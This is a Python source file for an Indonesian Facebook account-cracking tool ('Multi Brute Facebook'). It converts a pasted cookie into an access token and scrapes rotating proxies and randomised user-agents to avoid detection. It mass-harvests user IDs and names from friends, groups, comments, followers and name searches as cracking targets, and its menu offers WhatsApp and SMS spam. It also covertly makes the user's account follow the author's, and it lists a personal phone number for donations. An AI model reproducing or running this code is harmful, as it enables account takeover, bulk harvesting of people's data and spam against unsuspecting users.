# [+] Update By BrayennnXD And All
# [+] Script Free Jangan Di Perjual Belikan Ya
# [+] Donasi Untuk BrayennnXD 
# [+] Dana : 089622155832
# [+] Thanks Buat Yang Dah Bantu Donasi 😁

#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#------------------[  MODULE  ]-------------------#
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ GLOBAL NAME ]-------------------#
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
uidl =[]
opsi=[]
uidf=[]
liu=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; BMBF | BrayennnXD Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD');exit()
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='Redmi 4A Build/MMB29M; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 hola_android'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	

#------------[ UBAH UA DIH SINI OM ]---------------#
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    merek = random.choice(['SM-A405FN','SM-A346M','SM-J415FN','SM-X706B','SM-J337R4','SM-A9000','SM-G532G','SM-J810M','SM-T280'])
    build = random.choice(['LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.{str(rr(0,4))} Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,12))}.{str(rr(1,9))}.{str(rr(1,9))}like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile/14G60 Safari/604.1"
    UaMainn = random.choice([u1, u2, u3])
    ugen.append(UaMainn)

for memekx in range(200):
	android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
	fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
	fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
	build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016']
	merk2 = ['Lenovo TB2-X30L','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2']
	fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
	fblc = str(random.choice(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID']))
	fbpn = str(random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite']))
	merk_build = str(random.choice(merk2))+'<=>'+str(random.choice(build2));merks,build2 = merk_build.split('<=>')
	large = str(random.choice(['1.0','1.5','2.0','2.5','3.0','3.5']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']));denincity,width,heigt = large.split('<=>')      
	dalvik = str(random.choice(['2.1.0','2.0.0','1.6.0','1.5.0','1.4.0','1.2.0','1.1.0']))
	ua1 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; vivo 1612 Build/NRD90M) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/vivo;FBBD/vivo;FBDV/vivo 1612;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua2 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merks)+' Build/'+str(build2)+') [FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBDV/merek;FBSV/'+str(android)+';FBDM/{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua3 = 'Dalvik/2.1.0 (Linux; U; Android '+str(android)+'; Redmi 5A Build/'+str(build2)+') [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 5A;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	api = str(rc([ua1,ua2,ua3]))
	liu.append(api)
	
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold green]                ___  ____ ____ _   _ ____ _  _ _  _ _  _ 
[bold green]                |__] |__/ |__|  \_/  |___ |\ | |\ | |\ | 
[bold green]                |__] |  \ |  |   |   |___ | \| | \| | \|                                                                                                        
             """,width=90,padding=(0,8),title=f"Banner",style=f"bold white"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
	cetak(panel(f"[[bold cyan]01[bold white]] Login Menggunakan Cookie              [[bold cyan]03[bold white]] Crack Instagram \n[[bold cyan]02[bold white]] Menu Crack Tanpa Login                [[bold cyan]04[bold white]] Cek Hasil Crack ",width=90,title=f"[bold green]Menu Bot",padding=(0,2),style=f"bold white"))
	bryn = input(f' [+] Pilih Menu : ')
	if bryn in ['1','01']:
		login_lagi334()
	elif bryn in ['2','02']:
		crack_email()
	elif bryn in ['3','03']:
		error()
	elif bryn in ['4','04']:
		result()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		time.sleep(5)
		exit()
		
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			li = ' [+] Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login123()
		
def login_lagi334():
	try:
		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
		your_cookies = input(' [+] Masukan Cookie : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n [+] Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							os.system("xdg-open https://chat.whatsapp.com/InwlvDU3t6d9FShXwfH2MV")
							print("\n [+] Login Berhasil | python BrayennnFB.py");followdong()
			except Exception as e:
				print(" [+] Cookies Mokad Kontol")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				exit()
	except:pass

def followdong():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	myuid = ('100001571125775')
	try:
		for foll in parser(requests.get(f'https://mbasic.facebook.com/'+myuid,cookies={'cookie':cokies}).text,'html.parser').find_all('a',href=True):
			if '/a/subscribe.php?' in foll.get('href'):
				x=requests.get('https://mbasic.facebook.com'+foll['href'],cookies = {'cookie':cokies}).text
				exit()
	except(Exception)as e:print(e)#< Response error
	
#----------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	ip = requests.get("http://ip-api.com/json/").json()["query"]
	kota = requests.get("http://ip-api.com/json/").json()["city"]
	region = requests.get("http://ip-api.com/json/").json()["region"]
	times = requests.get("http://ip-api.com/json/").json()["timezone"]
	day = datetime.now().strftime("%d-%b-%Y")
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]Tanggal  : [bold green]{day}[/][/]\n[bold white][+[/][bold white]][/] [bold white]Status   : [bold green]Premium[/][/]\n[bold white][+[/][bold white]][/] [bold white]Versi Sc : [bold green]Update 3.4[/][/] ',width=43,padding=(0,3),style=f"bold white"))
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Country  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]City     : [bold green]{kota}[/]\n[bold white][+[/][bold white]][/] [bold white]Region   : [bold green]{region}[/][/]\n[bold white][+[/][bold white]][/] [bold white]TimeZone : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]My Ip    : [bold green]{ip}[/][/] ',width=43,padding=(0,3),style=f"bold white"))
	console.print(Columns(dia))
	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Rochmat Basuki , Nazri XD , Aorec XD , Lukman-XD , Dapunta , Kall",width=90,title=f"[bold green]Thanks To",style=f"bold white"))
	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack From Friends     [bold white][[bold cyan]06[bold white]] Crack From Username[bold white]      [[bold cyan]11[bold white]] Get Headers      \n[bold white][[bold cyan]02[bold white]] Crack From Massal      [bold white][[bold cyan]07[bold white]] Crack From Followers     [[bold cyan]12[bold white]] Spam WhatsApp      \n[bold white][[bold cyan]03[bold white]] Crack From Groups      [[bold cyan]08[bold white]] Crack From Comment       [bold white][[bold cyan]13[bold white]] Spam Sms \n[bold white][[bold cyan]04[bold white]] Crack From Email       [bold white][[bold cyan]09[bold white]] Check Opsi Checkpoint [bold white]   [[bold cyan]14[bold white]] Dump Id \n[bold white][[bold cyan]05[bold white]] Crack From Files       [bold white][[bold cyan]10[bold white]] [bold white]Check Result Crack [bold white]      [[bold cyan]15[bold white]] [bold red]Delete Cookies",width=90,title=f"[bold green]List Menu",style=f"bold white"))
	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
	if _____brayennn___xd____ in ['1','01']:
		brayen_dump()
	elif _____brayennn___xd____ in ['2','02']:
		dump_massal()
	elif _____brayennn___xd____ in ['3','03']:
		crack_group()
	elif _____brayennn___xd____ in ['4','04']:
		crack_email()
	elif _____brayennn___xd____ in ['5','05']:
		crack_file()
	elif _____brayennn___xd____ in ['6','06']:
		crack_nama()
	elif _____brayennn___xd____ in ['7','07']:
		pengikut()
	elif _____brayennn___xd____ in ['8','08']:
		komen()
	elif _____brayennn___xd____ in ['9','09']:
		file_cp()
	elif _____brayennn___xd____ in ['10']:
		result()
	elif _____brayennn___xd____ in ['11']:
		siu()
	elif _____brayennn___xd____ in ['12']:
		spam_wa()
	elif _____brayennn___xd____ in ['13']:
		spam_sms()
	elif _____brayennn___xd____ in ['14']:
		dumpid()
	elif _____brayennn___xd____ in ['15']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' [+] {m}Sukses Logout+Hapus Cookies')
		time.sleep(5)
		login()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		exit()
def error():
	print(f' [+] Maaf Fitur Ini Masih Di Perbaiki')
	time.sleep(4)
	
def siu():
	start()
	get_data_web()
	akhir()

###---------[ CRACK DARI KOMEN ]---------- ###
def komen():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold white"))
	ide = input(f' [+] Masukan Id Postingan : ')
	get_komen('https://mbasic.facebook.com/'+ide,cokies)
	print("\r")
	setting()
	
def get_komen(url,cokies):
	data = parser(ses.get(url,cookies={"cookie": cokies}).text, "html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","").split('?')[0]
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:dump.append(id+"|"+nama)
			print('\r [+] Mengumpulkan %s Id'%(len(id)),end='')
	for z in data.find_all("a",href=True):
		if "Lihat komentar lainnya…" in z.text or "Lihat komentar sebelumnya…'" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z.get["href"],cokies)
			except:pass
		
#-----------------[ DUMP ID ]-----------------# 
def dumpid():
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cok.txt','r').read()
		os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:
		barelang = input(f" [+] Masukan Id  : ")
		batuampar = input(f" [+] Nama File Dump  : ")
		gajahmada  = ('/sdcard/DUMP-FILE/' + batuampar + '.txt').replace(' ', '_')
		xxx = open(gajahmada, 'w')
		coki = {"cookie":cookie}
		smpn20 = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(barelang,token),cookies=coki).json()
		for sekupang in smpn20['friends']['data']:
			id.append(sekupang['id']+'|'+sekupang['name'])
			xxx.write(sekupang['id']+'|'+sekupang['name']+ '\n')
			print('\r [+] Mengumpulkan %s Id'%(len(id)),end='')
			time.sleep(0.0050)
		print(f"\n [+] Berhasil Dump Id Dari Publik")
		print(f" [+] Salin Output File + [ %s ]"%(gajahmada))
		exit()
	except (KeyError,IOError):
		os.remove(gajahmada)
		print(f" [+] Gagal Dump Id, Kemungkinan Id Tidak Ada")
		exit()
#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	cetak(nel(' Pastikan Idz Grup Bersifat Publik , Mohon Bersabar Dump Id Grup Sangat Lambat',width=90,style=f"bold white"))
	url = input(f' [+] Id Group : ')
	kocak("https://mbasic.facebook.com/groups/"+url,cokies)
	print("\r")
	setting()

def kocak(url,cokies):
	data = parser(ses.get(url,cookies={"cookie": cokies}).text, "html.parser")
	judul = re.findall("<title>(.*?)</title>",str(data))[0]
	if str(judul) == 'Use basic mode':
		print('\n [+] Cokies Berada Dalam Mode Free');exit()
	if str(judul) == 'Epsilon':
		print('\n [+] Cokies Tidak Dpt Mengakses Grup');exit()
	if str(judul) == 'Kesalahan':
		print('\n [+] Cokies Yg Anda Masukan Salah');exit()
	if str(judul) == 'Masuk Facebook' or str(judul) == 'Masuk Facebook | Facebook' or str(judul) == 'Masuk ke Facebook' or str(judul) == 'Log in to Facebook':
		print('\n [+] Cokies Mokad');exit()
	else:
		for isi in data.find_all("h3"):
			for ids in isi.find_all("a",href=True):
				if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
				else:
					if ids.text==judul:pass
					else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
				if uid+"|"+nama in id:pass
				else:id.append(uid+"|"+nama)
				print('\r [+] Mengumpulkan %s Id'%(len(id)),end='')
		for x in data.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in x.text:
				kocak("https://mbasic.facebook.com"+x.get("href"),cokies)
			
###----------[ DUMP PENGIKUT ]---------- ###
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	ses = requests.Session()
	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	user = input(f" [+] Masukan Id : ")
	if user.isdigit():
		url = (f"https://mbasic.facebook.com/profile.php?id={user}&v=followers")
	else:
		url = (f"https://mbasic.facebook.com/{user}?v=followers")
	try:
		link = ses.get(url, cookies={"cookie": cookie}).text
		if "Halaman Tidak Ditemukan" in link:
			print("\n [+] Pengguna Dengan User Id {user} Tidak Ditemukan")
			time.sleep(2);exit()
		elif "Anda Diblokir Sementara" in link:
			print("\n [+] Akun Anda Di Batasin Sementara")
			time.sleep(2);exit()
		elif "Konten Tidak Ditemukan" in link:
			print("\n [+] Pengguna Dengan User Id {user} Tidak Ditemukan")
			time.sleep(2);exit()
		else:
			dump_followers(url, cookie)
	except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout) as e:
		print(" [+] Tidak Ada Koneksi Internet, Periksa Kembali Koneksi Anda")
		time.sleep(3);exit()
	print("\r")
	setting()


def dump_followers(link, cookie):
	try:
		url = ses.get(link, cookies={"cookie": cookie}).text
		data = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', str(url))
		for user in data:
			if "profile.php?" in user[0]:
				id.append(re.findall("id=(.*?)&amp;eav", user[0])[0]+'|'+user[1])
			else:
				id.append(re.findall("(.*?)\?eav", user[0])[0]+'|'+user[1])
			Console().print(f" [+] Sedang Mengumpulkan {str(len(id))} Id...", end='\r')
			time.sleep(000000.003)
		if "Lihat Selengkapnya" in url:
			dump_followers("https://mbasic.facebook.com"+parser(url, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), cookie)
	except:pass
#----------------------[ CRACK USERNAME ]----------------------#
def crack_nama():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	nama = []
	custom = [" ranti"," rindu"," duda"," janda"," montok"," tepos"," caca"," cantik"," ganteng"," jancok"," batam"," papua"," crish"," erma"," yanti"]
	custom2 = [" iqbal"," kami"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," juven"," der"," rika"]
	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 3.000 Username",width=90,padding=(0,2),style=f"bold white"))
	nam = console.input(f' [+] Masukan Nama : ').split(",")
	for ser in nam:
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			cari_nama("https://mbasic.facebook.com/public/"+id,cokies)
	print("\r")
	setting()
		
def cari_nama(link,cokies):
	r = parser(ses.get((str(link)),cookies={"cookie": cokies}).text, "html.parser")
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
